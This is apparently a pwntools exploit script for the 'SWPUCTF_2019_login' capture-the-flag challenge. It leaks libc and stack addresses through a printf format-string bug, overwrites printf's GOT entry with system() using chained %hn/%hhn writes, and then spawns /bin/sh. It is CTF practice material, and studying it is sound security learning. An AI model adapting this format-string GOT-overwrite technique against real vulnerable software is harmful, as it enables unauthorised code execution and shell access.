from pwn import*
from LibcSearcher import LibcSearcher
context(os='linux',arch='i386',log_level='debug')
# r=remote("node5.buuoj.cn",28258)
r=process("./SWPUCTF_2019_login")
elf=ELF("./SWPUCTF_2019_login")
libc=ELF("/home/hacker/glibc-all-in-one/libs/2.27-3ubuntu1.5_i386/libc-2.27.so")
print_got=elf.got['printf']
print(hex(print_got))
r.recvuntil(b'Please input your name: ')
r.sendline(b'aaa')
r.recvuntil(b'Please input your password: ')
r.sendline(b'%43$p')
r.recvuntil(b'This is the wrong password: ')
leak=int(r.recvline().strip(),16)-147
print(hex(leak))
# libc = LibcSearcher("__libc_start_main",leak)
# libc_base=leak-libc.dump('__libc_start_main')
# system=libc_base+libc.dump('system')
# print(hex(system))
libc_base=leak-libc.symbols['__libc_start_main']
system=libc_base+libc.symbols['system']
r.sendline(b'%10$p')
r.recvuntil(b'This is the wrong password: ')
stack_addr=int(r.recvline().strip(),16)
print(hex(stack_addr))
payload=(f"%{print_got&0xffff}c%10$hn").encode()
r.sendafter(b'Try again!',payload)
payload=(f"%{(stack_addr+2)&0xff}c%6$hhn").encode()
print(payload)
r.sendafter(b'Try again!',payload)
payload=(f"%{(print_got>>16)&0xffff}c%10$hn").encode()
r.sendafter(b'Try again!',payload)

####

payload=(f"%{(stack_addr+4)&0xff}c%6$hhn").encode()
r.sendafter(b'Try again!',payload)
payload=(f"%{(print_got+2)&0xffff}c%10$hn").encode()
r.sendafter(b'Try again!',payload)
payload=(f"%{(stack_addr+6)&0xff}c%6$hhn").encode()
r.sendafter(b'Try again!',payload)
payload=(f"%{(print_got>>16)&0xffff}c%10$hn").encode()
# gdb.attach(r)
# pause()
r.sendafter(b'Try again!',payload)

####

num1=system&0xffff
num2=(system>>16)&0xffff
payload=(f'%{num1}c%14$hn').encode()
r.sendafter(b'Try again!',payload)
payload=(f'%{num2}c%15$hn').encode()
r.sendafter(b'Try again!',payload)

# gdb.attach(r)
# pause()
r.sendafter(b'Try again!',b'/bin/sh')
r.interactive()




